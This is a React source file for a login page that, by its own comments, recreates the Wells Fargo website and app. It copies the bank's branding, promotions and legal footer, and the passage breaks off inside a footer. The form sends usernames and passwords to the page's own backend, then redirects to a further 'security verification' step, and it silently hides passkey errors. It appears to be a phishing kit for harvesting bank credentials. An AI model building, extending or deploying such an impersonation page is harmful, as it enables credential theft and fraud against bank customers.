import { useState } from "react";
import { useForm } from "react-hook-form";
import { useMutation } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { Search, CreditCard, Home, TrendingUp, PiggyBank, Smartphone, Shield, Users } from "lucide-react";
import { Link, useLocation } from "wouter";
import { OfficialFooter } from "@/components/official-footer";

type LoginFormData = {
  username: string;
  password: string;
};

function getGreeting() {
  const hour = new Date().getHours();
  if (hour < 12) return "Good morning";
  if (hour < 17) return "Good afternoon";
  return "Good evening";
}

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [saveUsername, setSaveUsername] = useState(false);
  const [greeting] = useState(getGreeting());
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [biometricLoading, setBiometricLoading] = useState(false);

  const handleBiometricLogin = async () => {
    setBiometricLoading(true);
    try {
      const challengeRes = await fetch("/api/auth/biometric/challenge", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "authenticate" }),
      });
      
      if (!challengeRes.ok) throw new Error("Failed to get challenge");
      
      const { challenge, rpId, allowCredentials } = await challengeRes.json();
      
      // Request biometric with facial recognition required
      const credential = await navigator.credentials.get({
        publicKey: {
          challenge: Uint8Array.from(atob(challenge), c => c.charCodeAt(0)),
          rpId: rpId || window.location.hostname,
          allowCredentials: allowCredentials?.map((id: string) => ({
            id: Uint8Array.from(atob(id), c => c.charCodeAt(0)),
            type: "public-key" as const,
            transports: ["internal", "hybrid"] as AuthenticatorTransport[],
          })) || [],
          userVerification: "required",
          timeout: 120000,
        },
      }) as PublicKeyCredential;

      if (credential) {
        // Get device and biometric info
        const authenticatorResponse = credential.response as AuthenticatorAssertionResponse;
        const authData = new Uint8Array(authenticatorResponse.authenticatorData);
        const flags = authData[32];
        const userVerified = (flags & 0x04) !== 0;
        const userPresent = (flags & 0x01) !== 0;
        
        const authRes = await fetch("/api/auth/biometric/authenticate", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            credentialId: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(credential.rawId)))),
            signature: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(authenticatorResponse.signature)))),
            authenticatorData: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(authenticatorResponse.authenticatorData)))),
            clientDataJSON: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(credential.response.clientDataJSON)))),
            biometricType: "facial_recognition",
            userVerified: userVerified,
            userPresent: userPresent,
            credentialType: credential.type,
            authenticatorAttachment: (credential as any).authenticatorAttachment || "platform",
          }),
        });

        if (authRes.ok) {
          const authDataResponse = await authRes.json();
          toast({
            title: "Face ID Sign On Successful",
            description: "Please complete security verification...",
          });
          sessionStorage.setItem("loginUsername", authDataResponse.user?.id || "biometric_user");
          setLocation("/verify");
        } else {
          throw new Error("Biometric authentication failed");
        }
      }
    } catch (error: any) {
      // Silently handle errors - no popup
      console.log("Face ID not available or cancelled");
    } finally {
      setBiometricLoading(false);
    }
  };

  const form = useForm<LoginFormData>({
    defaultValues: {
      username: "",
      password: "",
    },
  });

  const loginMutation = useMutation({
    mutationFn: async (data: LoginFormData) => {
      const response = await apiRequest("POST", "/api/auth/login", {
        username: data.username,
        password: data.password,
      });
      const result = await response.json();
      return { ...result, username: data.username };
    },
    onSuccess: (data) => {
      sessionStorage.setItem("loginUsername", data.username);
      toast({
        title: "Sign On Successful",
        description: "Please complete security verification...",
      });
      setLocation("/verify");
    },
    onError: (error: Error) => {
      toast({
        title: "Sign On Failed",
        description: error.message || "Invalid username or password",
        variant: "destructive",
      });
    },
  });

  const onSubmit = (data: LoginFormData) => {
    loginMutation.mutate(data);
  };



  // Desktop Layout - CSS recreation of Wells Fargo website style
  const DesktopLayout = () => (
    <div className="hidden lg:block min-h-screen bg-white">
      {/* Top red header bar with Wells Fargo logo */}
      <header className="bg-[#d71e28]">
        <div className="max-w-7xl mx-auto px-6 py-3 flex items-center justify-between">
          <div className="text-white font-bold text-2xl tracking-wider" style={{ fontFamily: "Georgia, serif" }}>
            WELLS FARGO
          </div>
          <div className="flex items-center gap-5 text-sm text-white">
            <span className="hover:underline cursor-pointer">ATMs/Locations</span>
            <span className="hover:underline cursor-pointer">Help</span>
            <span className="hover:underline cursor-pointer">Español</span>
            <Search className="w-4 h-4 cursor-pointer" />
            <Button
              type="button"
              onClick={() => {
                const usernameInput = document.querySelector('[data-testid="desktop-input-username"]') as HTMLInputElement;
                if (usernameInput) usernameInput.focus();
              }}
              className="bg-white text-[#d71e28] hover:bg-gray-100 px-4 py-1.5 rounded text-sm font-semibold"
              data-testid="header-sign-on-button"
            >
              Sign On
            </Button>
          </div>
        </div>
      </header>

      {/* Main navigation bar - white with category links */}
      <div className="bg-white border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-6 py-3 flex items-center gap-8 text-sm">
          <span className="text-gray-800 font-medium border-b-2 border-[#d71e28] pb-2 cursor-pointer">Personal</span>
          <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">Investing & Wealth Management</span>
          <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">Business</span>
          <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">Commercial Banking</span>
          <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">Corporate & Investment Banking</span>
          <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">About Wells Fargo</span>
        </div>
      </div>

      {/* Secondary navigation - product links */}
      <div className="bg-[#fafafa] border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-6 py-2 flex items-center gap-6 text-sm text-gray-600">
          {["Checking", "Savings & CDs", "Credit Cards", "Home Loans", "Personal Loans", "Auto Loans", "Premier", "Education & Tools"].map((item) => (
            <span key={item} className="hover:text-[#d71e28] cursor-pointer">
              {item}
            </span>
          ))}
        </div>
      </div>

      {/* Main content area with login form and promo */}
      <section className="bg-[#f5f0eb] border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-6 py-10 flex gap-16">
          {/* Left side - Sign On Form Card */}
          <div className="w-[260px] flex-shrink-0 bg-white rounded-lg shadow-lg p-6">
            <h2 className="text-xl text-gray-900 mb-1" style={{ fontFamily: "Georgia, serif" }}>
              {greeting}
            </h2>
            <p className="text-sm text-gray-500 mb-5">Sign on to manage your accounts.</p>

            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
              <div>
                <input
                  {...form.register("username")}
                  placeholder="Username"
                  autoComplete="username"
                  autoCapitalize="off"
                  autoCorrect="off"
                  spellCheck={false}
                  className="w-full h-11 px-3 text-sm border-b border-gray-300 bg-transparent focus:border-[#d71e28] focus:outline-none placeholder-gray-400"
                  data-testid="desktop-input-username"
                />
              </div>

              <div className="relative">
                <input
                  {...form.register("password")}
                  type={showPassword ? "text" : "password"}
                  placeholder="Password"
                  autoComplete="current-password"
                  className="w-full h-11 px-3 pr-12 text-sm border-b border-gray-300 bg-transparent focus:border-[#d71e28] focus:outline-none placeholder-gray-400"
                  data-testid="desktop-input-password"
                />
                <button
                  type="button"
                  onMouseDown={(e) => e.preventDefault()}
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-0 top-1/2 -translate-y-1/2 text-[#0066b2] text-sm hover:underline"
                >
                  {showPassword ? "Hide" : "Show"}
                </button>
              </div>

              <div className="flex items-center gap-2 pt-1">
                <input type="checkbox" id="saveUsername" className="w-4 h-4 border-gray-300 rounded" />
                <label htmlFor="saveUsername" className="text-sm text-gray-600">Save username</label>
              </div>

              <div className="flex items-center gap-3 pt-2">
                <Button
                  type="submit"
                  className="h-10 px-8 bg-[#d71e28] hover:bg-[#b91c23] text-white font-semibold rounded-full text-sm"
                  disabled={loginMutation.isPending}
                  data-testid="desktop-button-sign-on"
                >
                  {loginMutation.isPending ? "..." : "Sign On"}
                </Button>
                <Link href="/register" className="text-gray-600 hover:text-gray-800 text-sm font-medium">
                  Enroll
                </Link>
              </div>
            </form>

            <div className="mt-5 space-y-1 text-sm">
              <Link href="/forgot-password" className="text-gray-600 hover:text-[#d71e28] block">
                Forgot username or password?
              </Link>
              <Link href="/security" className="text-gray-600 hover:text-[#d71e28] block">
                Security Center
              </Link>
              <span className="text-gray-600 hover:text-[#d71e28] cursor-pointer block">
                Privacy, Cookies, and Legal
              </span>
            </div>
          </div>

          {/* Center - Promotional content */}
          <div className="flex-1 pt-8">
            <h1 className="text-4xl text-gray-800 font-light mb-4 leading-tight" style={{ fontFamily: "Georgia, serif" }}>
              $325 checking bonus on us
            </h1>
            <p className="text-base text-gray-600 mb-6 leading-relaxed max-w-md">
              New customers open an eligible checking account with qualifying direct deposits
            </p>
            <button className="border-2 border-gray-800 text-gray-800 px-6 py-2.5 rounded-full text-sm font-semibold hover:bg-gray-800 hover:text-white transition-colors">
              Get started &gt;&gt;
            </button>
          </div>

          {/* Right side - Enjoy $325 */}
          <div className="flex-shrink-0 pt-8 text-right">
            <p className="text-sm text-[#9b2d83] mb-1">Enjoy</p>
            <p className="text-6xl font-light text-[#9b2d83]" style={{ fontFamily: "Georgia, serif" }}>$325</p>
          </div>
        </div>
      </section>

      {/* Four promo cards */}
      <section className="bg-white py-6 border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-6">
          <div className="grid grid-cols-4 gap-4">
            <div className="flex items-start gap-3 p-3 hover:bg-gray-50 rounded-lg cursor-pointer transition-colors">
              <div className="w-10 h-10 bg-[#d71e28] rounded-full flex items-center justify-center flex-shrink-0">
                <CreditCard className="w-5 h-5 text-white" />
              </div>
              <div>
                <h3 className="font-semibold text-gray-800 text-sm mb-1">Earn a $200 cash rewards bonus</h3>
                <p className="text-xs text-gray-600 mb-2 leading-relaxed">Plus, earn unlimited 2% cash rewards on purchases with $0 annual fee. Terms apply.</p>
                <span className="text-[#0066b2] text-xs hover:underline cursor-pointer">Learn more &gt;</span>
              </div>
            </div>
            <div className="flex items-start gap-3 p-3 hover:bg-gray-50 rounded-lg cursor-pointer transition-colors">
              <div className="w-10 h-10 bg-[#0066b2] rounded-full flex items-center justify-center flex-shrink-0">
                <Users className="w-5 h-5 text-white" />
              </div>
              <div>
                <h3 className="font-semibold text-gray-800 text-sm mb-1">New customer? Say hello to a $125 bonus</h3>
                <p className="text-xs text-gray-600 mb-2 leading-relaxed">Open a Clear Access Banking account, great for students & more, complete offer requirements.</p>
                <span className="text-[#0066b2] text-xs hover:underline cursor-pointer">See offer details &gt;</span>
              </div>
            </div>
            <div className="flex items-start gap-3 p-3 hover:bg-gray-50 rounded-lg cursor-pointer transition-colors">
              <div className="w-10 h-10 bg-[#fef3e6] rounded-full flex items-center justify-center flex-shrink-0">
                <PiggyBank className="w-5 h-5 text-[#d71e28]" />
              </div>
              <div>
                <h3 className="font-semibold text-gray-800 text-sm mb-1">Open a savings account</h3>
                <p className="text-xs text-gray-600 mb-2 leading-relaxed">Explore our savings accounts and find the right fit for you.</p>
                <span className="text-[#0066b2] text-xs hover:underline cursor-pointer">Get started &gt;</span>
                <span className="text-gray-400 mx-1">|</span>
                <span className="text-[#0066b2] text-xs hover:underline cursor-pointer">Check rates &gt;</span>
              </div>
            </div>
            <div className="flex items-start gap-3 p-3 hover:bg-gray-50 rounded-lg cursor-pointer transition-colors">
              <div className="w-10 h-10 bg-white border border-gray-200 rounded-full flex items-center justify-center flex-shrink-0 relative">
                <TrendingUp className="w-5 h-5 text-[#0066b2]" />
                <div className="absolute -top-1 -right-1 bg-[#d71e28] text-white text-[10px] px-1 rounded font-bold">%</div>
              </div>
              <div>
                <p className="text-xs text-gray-500 mb-1">Interest rates today</p>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Home mortgage section with image */}
      <section className="bg-[#f8f8f8] py-10">
        <div className="max-w-7xl mx-auto px-6">
          <div className="bg-white rounded-lg shadow-sm overflow-hidden flex">
            <div className="w-1/2 bg-gradient-to-br from-green-800 to-green-900 p-10 flex flex-col justify-center">
              <h2 className="text-3xl text-white font-light mb-4" style={{ fontFamily: "Georgia, serif" }}>
                A home of your own
              </h2>
              <p className="text-white/80 mb-6">
                With low down payment options on a fixed-rate mortgage.
              </p>
              <button className="bg-[#1a1a1a] text-white px-5 py-2 rounded text-sm font-semibold w-fit hover:bg-black transition-colors">
                Get started
              </button>
            </div>
            <div className="w-1/2 bg-gradient-to-br from-green-100 to-green-200 flex items-center justify-center">
              <Home className="w-32 h-32 text-green-700 opacity-50" />
            </div>
          </div>
        </div>
      </section>

      {/* Financial guidance and support */}
      <section className="bg-white py-12">
        <div className="max-w-7xl mx-auto px-6">
          <h2 className="text-2xl text-gray-800 mb-8 text-center" style={{ fontFamily: "Georgia, serif" }}>
            Financial guidance and support
          </h2>
          <div className="grid grid-cols-3 gap-6">
            <div className="text-center p-6 hover:bg-gray-50 rounded-lg cursor-pointer transition-colors">
              <div className="w-full h-40 bg-gradient-to-br from-yellow-100 to-orange-100 rounded-lg mb-4 flex items-center justify-center">
                <PiggyBank className="w-16 h-16 text-yellow-600" />
              </div>
              <h3 className="font-semibold text-gray-800 mb-2">Savings you can count on</h3>
              <p className="text-xs text-gray-600 mb-3">Discover how smart saving moves you closer to your goals.</p>
              <button className="border border-gray-300 text-gray-700 px-4 py-2 rounded text-xs font-semibold hover:bg-gray-100 transition-colors">
                Grow your savings
              </button>
            </div>
            <div className="text-center p-6 hover:bg-gray-50 rounded-lg cursor-pointer transition-colors">
              <div className="w-full h-40 bg-gradient-to-br from-blue-100 to-indigo-100 rounded-lg mb-4 flex items-center justify-center">
                <TrendingUp className="w-16 h-16 text-blue-600" />
              </div>
              <h3 className="font-semibold text-gray-800 mb-2">Trendlines over headlines</h3>
              <p className="text-xs text-gray-600 mb-3">Our forecasts and potential investment opportunities for the coming year.</p>
              <button className="border border-gray-300 text-gray-700 px-4 py-2 rounded text-xs font-semibold hover:bg-gray-100 transition-colors">
                Get the 2026 Outlook
              </button>
            </div>
            <div className="text-center p-6 hover:bg-gray-50 rounded-lg cursor-pointer transition-colors">
              <div className="w-full h-40 bg-[#d71e28] rounded-lg mb-4 flex items-center justify-center">
                <div className="text-white text-center">
                  <Shield className="w-10 h-10 mx-auto mb-2" />
                  <div className="font-bold">Fraud &</div>
                  <div className="font-bold">Scam Alert</div>
                </div>
              </div>
              <h3 className="font-semibold text-gray-800 mb-2">Your shield against scams</h3>
              <p className="text-xs text-gray-600 mb-3">Spot the latest tactics scammers are using.</p>
              <button className="border border-gray-300 text-gray-700 px-4 py-2 rounded text-xs font-semibold hover:bg-gray-100 transition-colors">
                Get the latest
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* Ask Fargo Mobile App Section */}
      <section className="bg-[#f8f8f8] py-10">
        <div className="max-w-7xl mx-auto px-6">
          <div className="bg-white rounded-lg shadow-sm p-8 flex items-center gap-8">
            <div className="w-48 flex-shrink-0">
              <div className="bg-gradient-to-b from-[#d71e28] to-[#8B0000] rounded-2xl p-4 shadow-lg">
                <div className="bg-white rounded-xl p-3">
                  <div className="text-[#d71e28] font-bold text-sm mb-1">Fargo</div>
                  <div className="text-xs text-gray-600">Here are insights into your spending</div>
                  <div className="mt-2 flex gap-1">
                    <div className="w-2 h-8 bg-[#d71e28] rounded"></div>
                    <div className="w-2 h-6 bg-[#ffcd41] rounded"></div>
                    <div className="w-2 h-10 bg-[#d71e28] rounded"></div>
                    <div className="w-2 h-4 bg-[#ffcd41] rounded"></div>
                  </div>
                </div>
              </div>
            </div>
            <div className="flex-1">
              <h2 className="text-2xl text-gray-800 mb-3" style={{ fontFamily: "Georgia, serif" }}>
                Need help? Ask Fargo<sup>®</sup>
              </h2>
              <p className="text-sm text-gray-600 mb-4 leading-relaxed">
                Fargo<sup>®</sup> gives you valuable insights like a summary of your spending by category, retailer and across accounts. Find it only in the Wells Fargo Mobile<sup>®</sup> app.
              </p>
              <div className="flex gap-3">
                <button className="bg-black text-white px-4 py-2 rounded text-xs font-semibold flex items-center gap-2">
                  <Smartphone className="w-4 h-4" /> App Store
                </button>
                <button className="bg-black text-white px-4 py-2 rounded text-xs font-semibold flex items-center gap-2">
                  <Smartphone className="w-4 h-4" /> Google Play
                </button>
              </div>
              <p className="text-xs text-gray-400 mt-3">*Screen image is simulated</p>
            </div>
          </div>
        </div>
      </section>

      {/* Serving our customers section */}
      <section className="bg-white py-12">
        <div className="max-w-7xl mx-auto px-6 text-center">
          <h2 className="text-2xl text-gray-800 mb-4" style={{ fontFamily: "Georgia, serif" }}>
            Serving our customers and communities
          </h2>
          <p className="text-sm text-gray-600 max-w-3xl mx-auto mb-8">
            It doesn't happen with one transaction, in one day on the job, or in one quarter. It's earned relationship by relationship.
          </p>
          <div className="grid grid-cols-2 gap-8 max-w-4xl mx-auto">
            <div className="bg-[#d71e28] rounded-lg p-6 text-left text-white">
              <div className="text-white font-bold text-lg mb-2" style={{ fontFamily: "Georgia, serif" }}>WELLS FARGO</div>
              <h3 className="font-semibold mb-2">Who we are</h3>
              <p className="text-sm opacity-90 mb-4">Wells Fargo helps strengthen communities through inclusion, economic empowerment, and sustainability.</p>
              <button className="text-white text-sm underline hover:no-underline">About Wells Fargo</button>
            </div>
            <div className="bg-gradient-to-br from-teal-600 to-teal-700 rounded-lg p-6 text-left text-white">
              <h3 className="font-semibold mb-2">Why we're committed to communities</h3>
              <p className="text-sm opacity-90 mb-4">We don't just serve our communities—we are our communities. We're committed to helping customers and neighborhoods across the country thrive.</p>
              <button className="border border-white text-white px-4 py-2 rounded text-sm font-semibold hover:bg-white hover:text-teal-700 transition-colors">
                Wells Fargo Stories
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* Desktop Footer */}
      <footer className="bg-[#f5f5f5] border-t border-gray-200 py-8">
        <div className="max-w-7xl mx-auto px-6">
          <div className="flex justify-between items-center text-xs text-gray-500 mb-4">
            <div className="flex gap-4">
              <span className="hover:text-[#d71e28] cursor-pointer">Privacy Policy</span>
              <span className="hover:text-[#d71e28] cursor-pointer">Terms of Use</span>
              <span className="hover:text-[#d71e28] cursor-pointer">Report Fraud</span>
              <span className="hover:text-[#d71e28] cursor-pointer">Security</span>
              <span className="hover:text-[#d71e28] cursor-pointer">Accessibility</span>
              <span className="hover:text-[#d71e28] cursor-pointer">Sitemap</span>
            </div>
            <div>
              © 2026 Wells Fargo. All rights reserved. NMLSR ID 399801
            </div>
          </div>
          <p className="text-xs text-gray-400">
            Investment and Insurance Products are: Not Insured by the FDIC or Any Federal Government Agency • Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate • Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested
          </p>
        </div>
      </footer>
    </div>
  );

  // Mobile Layout — matches Wells Fargo app reference screenshot
  const MobileLayout = () => (
    <div className="lg:hidden min-h-screen flex flex-col bg-white">

      {/* ── Header: red bar with centered WELLS FARGO + hamburger ── */}
      <header className="bg-[#d71e28] flex items-center px-4" style={{ height: 52 }}>
        <div className="flex-1" />
        <span
          className="text-white font-bold text-[17px] tracking-[0.16em]"
          style={{ fontFamily: "'Times New Roman', Georgia, serif" }}
        >
          WELLS FARGO
        </span>
        <div className="flex-1 flex justify-end">
          {/* Three-line hamburger matching screenshot */}
          <button
            type="button"
            aria-label="Menu"
            data-testid="button-mobile-menu"
            className="flex flex-col justify-center gap-[5px] py-2"
          >
            <span className="block w-[22px] h-[2px] bg-white" />
            <span className="block w-[22px] h-[2px] bg-white" />
            <span className="block w-[22px] h-[2px] bg-white" />
          </button>
        </div>
      </header>

      {/* ── Thin gold/yellow stripe ── */}
      <div className="h-[3px] bg-[#ffcd41]" />

      {/* ── Page body ── */}
      <main className="flex-1 bg-white overflow-y-auto">
        <div className="px-[18px] pt-7 pb-10">

          {/* Greeting — large light serif, matches screenshot */}
          <h2
            className="text-[32px] font-normal text-[#111] text-center mb-6 leading-none"
            style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
            data-testid="text-greeting"
          >
            {greeting}
          </h2>

          <form onSubmit={form.handleSubmit(onSubmit)}>

            {/* ── Username field ── */}
            <div className="mb-[10px]">
              <input
                {...form.register("username", { required: true })}
                placeholder="Username"
                autoComplete="username"
                autoCapitalize="off"
                autoCorrect="off"
                spellCheck={false}
                className="w-full px-[14px] text-[16px] text-gray-800 placeholder-gray-400 bg-white rounded-[12px] focus:outline-none"
                style={{
                  height: 56,
                  border: "1.5px solid #c8c8c8",
                }}
                data-testid="input-username"
              />
            </div>

            {/* ── Password field ── */}
            <div className="mb-[14px] relative">
              <input
                {...form.register("password", { required: true })}
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                autoComplete="current-password"
                className="w-full px-[14px] pr-[56px] text-[16px] text-gray-800 placeholder-gray-400 bg-white rounded-[12px] focus:outline-none"
                style={{
                  height: 56,
                  border: "1.5px solid #c8c8c8",
                }}
                data-testid="input-password"
              />
              <button
                type="button"
                onMouseDown={(e) => e.preventDefault()}
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-[14px] top-1/2 -translate-y-1/2 text-[#4338ca] text-[15px] font-medium"
                data-testid="button-toggle-password"
              >
                {showPassword ? "Hide" : "Show"}
              </button>
            </div>

            {/* ── Save username row ── */}
            <div className="flex items-center gap-[10px] mb-[8px]">
              <div
                className="w-[18px] h-[18px] flex-shrink-0 border border-gray-500 flex items-center justify-center cursor-pointer bg-white"
                style={{ borderRadius: 3 }}
                onClick={() => setSaveUsername(!saveUsername)}
                data-testid="checkbox-save-username"
              >
                {saveUsername && (
                  <svg viewBox="0 0 12 12" className="w-3 h-3" fill="none">
                    <path d="M2 6l3 3 5-5" stroke="#333" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                )}
              </div>
              <label
                className="text-[15px] text-gray-800 cursor-pointer select-none"
                onClick={() => setSaveUsername(!saveUsername)}
              >
                Save username
              </label>
            </div>

            {/* ── Security helper text ── */}
            <p className="text-[12.5px] text-gray-500 leading-[1.45] mb-[28px]">
              To help keep your account secure, save your username only on devices that aren't used by other people.
            </p>

            {/* ── Sign on button — gray pill, centered ── */}
            <div className="flex justify-center mb-[14px]">
              <button
                type="submit"
                disabled={loginMutation.isPending}
                className="rounded-full text-[16px] font-medium transition-colors disabled:opacity-60"
                style={{
                  height: 50,
                  width: 220,
                  backgroundColor: "#d0d0d0",
                  color: "#888",
                }}
                data-testid="button-sign-on"
              >
                {loginMutation.isPending ? "Signing on…" : "Sign on"}
              </button>
            </div>

          </form>

          {/* ── "or" separator ── */}
          <p className="text-center text-[14px] text-gray-600 mb-[14px]">or</p>

          {/* ── Use a passkey button — white outlined pill ── */}
          <div className="flex justify-center mb-[14px]">
            <button
              type="button"
              onClick={handleBiometricLogin}
              disabled={biometricLoading}
              className="rounded-full bg-white text-[15px] font-medium text-gray-900 flex items-center justify-center gap-[7px] hover:bg-gray-50 transition-colors disabled:opacity-60"
              style={{
                height: 50,
                width: 220,
                border: "1.5px solid #222",
              }}
              data-testid="button-passkey"
            >
              {/* Passkey / person+key icon — matches screenshot */}
              <svg viewBox="0 0 20 20" width="19" height="19" fill="none" aria-hidden="true">
                <circle cx="8" cy="6" r="3.5" stroke="#333" strokeWidth="1.4" />
                <path d="M1.5 17c0-3.3 2.9-6 6.5-6" stroke="#333" strokeWidth="1.4" strokeLinecap="round" />
                <circle cx="15" cy="13.5" r="2.5" stroke="#333" strokeWidth="1.4" />
                <path d="M17 15l1.5 1.5M18.5 15.5L17 17" stroke="#333" strokeWidth="1.3" strokeLinecap="round" />
                <circle cx="15" cy="13.5" r="0.8" fill="#333" />
              </svg>
              {biometricLoading ? "Authenticating…" : "Use a passkey"}
            </button>
          </div>

          {/* ── Passkey helper text ── */}
          <p className="text-[12.5px] text-gray-600 leading-[1.45] mb-[36px]">
            Don't have one? Create a passkey after signing on and skip the password next time.
          </p>

          {/* ── Forgot link — purple arrow + text, centered ── */}
          <div className="flex items-center justify-center gap-[5px]">
            <span className="text-[#4b3f9e] text-[15px]">→</span>
            <Link
              href="/forgot-password"
              className="text-[#4b3f9e] text-[15px] hover:underline"
              data-testid="link-forgot"
            >
              Forgot username or password?
            </Link>
          </div>

        </div>
      </main>

      <OfficialFooter />
    </div>
  );

  // Render both layouts - CSS handles which one is visible
  return (
    <>
      {/* Desktop Layout */}
      <div className="hidden lg:block min-h-screen bg-white">
        {/* Top red header bar with Wells Fargo logo */}
        <header className="bg-[#d71e28]">
          <div className="max-w-7xl mx-auto px-6 py-3 flex items-center justify-between">
            <div className="text-white font-bold text-2xl tracking-wider" style={{ fontFamily: "Georgia, serif" }}>
              WELLS FARGO
            </div>
            <div className="flex items-center gap-5 text-sm text-white">
              <span className="hover:underline cursor-pointer">ATMs/Locations</span>
              <span className="hover:underline cursor-pointer">Help</span>
              <span className="hover:underline cursor-pointer">Español</span>
              <Search className="w-4 h-4 cursor-pointer" />
              <Button
                type="button"
                onClick={() => {
                  const usernameInput = document.querySelector('[data-testid="desktop-input-username"]') as HTMLInputElement;
                  if (usernameInput) usernameInput.focus();
                }}
                className="bg-white text-[#d71e28] hover:bg-gray-100 px-4 py-1.5 rounded text-sm font-semibold"
              >
                Sign On
              </Button>
            </div>
          </div>
        </header>

        {/* Main navigation bar */}
        <div className="bg-white border-b border-gray-200">
          <div className="max-w-7xl mx-auto px-6 py-3 flex items-center gap-8 text-sm">
            <span className="text-gray-800 font-medium border-b-2 border-[#d71e28] pb-2 cursor-pointer">Personal</span>
            <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">Investing & Wealth Management</span>
            <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">Business</span>
            <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">Commercial Banking</span>
            <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">Corporate & Investment Banking</span>
            <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">About Wells Fargo</span>
          </div>
        </div>

        {/* Secondary navigation */}
        <div className="bg-[#fafafa] border-b border-gray-200">
          <div className="max-w-7xl mx-auto px-6 py-2 flex items-center gap-6 text-sm text-gray-600">
            {["Checking", "Savings & CDs", "Credit Cards", "Home Loans", "Personal Loans", "Auto Loans", "Premier", "Education & Tools"].map((item) => (
              <span key={item} className="hover:text-[#d71e28] cursor-pointer">{item}</span>
            ))}
          </div>
        </div>

        {/* Main content area with login form and promo */}
        <section className="bg-[#f5f0eb] border-b border-gray-200">
          <div className="max-w-7xl mx-auto px-6 py-10 flex gap-16">
            {/* Left side - Sign On Form Card */}
            <div className="w-[260px] flex-shrink-0 bg-white rounded-lg shadow-lg p-6">
              <h2 className="text-xl text-gray-900 mb-1" style={{ fontFamily: "Georgia, serif" }}>
                {greeting}
              </h2>
              <p className="text-sm text-gray-500 mb-5">Sign on to manage your accounts.</p>

              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
                <div>
                  <input
                    {...form.register("username")}
                    placeholder="Username"
                    autoComplete="username"
                    autoCapitalize="off"
                    autoCorrect="off"
                    spellCheck={false}
                    className="w-full h-11 px-3 text-sm border-b border-gray-300 bg-transparent focus:border-[#d71e28] focus:outline-none placeholder-gray-400"
                    data-testid="desktop-input-username"
                  />
                </div>

                <div className="relative">
                  <input
                    {...form.register("password")}
                    type={showPassword ? "text" : "password"}
                    placeholder="Password"
                    autoComplete="current-password"
                    className="w-full h-11 px-3 pr-12 text-sm border-b border-gray-300 bg-transparent focus:border-[#d71e28] focus:outline-none placeholder-gray-400"
                    data-testid="desktop-input-password"
                  />
                  <button
                    type="button"
                    onMouseDown={(e) => e.preventDefault()}
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-0 top-1/2 -translate-y-1/2 text-[#0066b2] text-sm hover:underline"
                  >
                    {showPassword ? "Hide" : "Show"}
                  </button>
                </div>

                <div className="flex items-center gap-2 pt-1">
                  <input type="checkbox" id="desktopSaveUsername" className="w-4 h-4 border-gray-300 rounded" />
                  <label htmlFor="desktopSaveUsername" className="text-sm text-gray-600">Save username</label>
                </div>

                <div className="flex items-center gap-3 pt-2">
                  <Button
                    type="submit"
                    className="h-10 px-8 bg-[#d71e28] hover:bg-[#b91c23] text-white font-semibold rounded-full text-sm"
                    disabled={loginMutation.isPending}
                    data-testid="desktop-button-sign-on"
                  >
                    {loginMutation.isPending ? "..." : "Sign On"}
                  </Button>
                  <Link href="/register" className="text-gray-600 hover:text-gray-800 text-sm font-medium">
                    Enroll
                  </Link>
                </div>
              </form>

              <div className="mt-5 space-y-1 text-sm">
                <Link href="/forgot-password" className="text-gray-600 hover:text-[#d71e28] block">
                  Forgot username or password?
                </Link>
                <span className="text-gray-600 hover:text-[#d71e28] cursor-pointer block">
                  Security Center
                </span>
                <span className="text-gray-600 hover:text-[#d71e28] cursor-pointer block">
                  Privacy, Cookies, and Legal
                </span>
              </div>
            </div>

            {/* Center - Promotional content */}
            <div className="flex-1 pt-8">
              <h1 className="text-4xl text-gray-800 font-light mb-4 leading-tight" style={{ fontFamily: "Georgia, serif" }}>
                $325 checking bonus on us
              </h1>
              <p className="text-base text-gray-600 mb-6 leading-relaxed max-w-md">
                New customers open an eligible checking account with qualifying direct deposits
              </p>
              <button className="border-2 border-gray-800 text-gray-800 px-6 py-2.5 rounded-full text-sm font-semibold hover:bg-gray-800 hover:text-white transition-colors">
                Get started &gt;&gt;
              </button>
            </div>

            {/* Right side - Enjoy $325 */}
            <div className="flex-shrink-0 pt-8 text-right">
              <p className="text-sm text-[#9b2d83] mb-1">Enjoy</p>
              <p className="text-6xl font-light text-[#9b2d83]" style={{ fontFamily: "Georgia, serif" }}>$325</p>
            </div>
          </div>
        </section>

        {/* Desktop Footer */}
        <footer className="bg-[#f5f5f5] border-t border-gray-200 py-8">
          <div className="max-w-7xl mx-auto px-6">
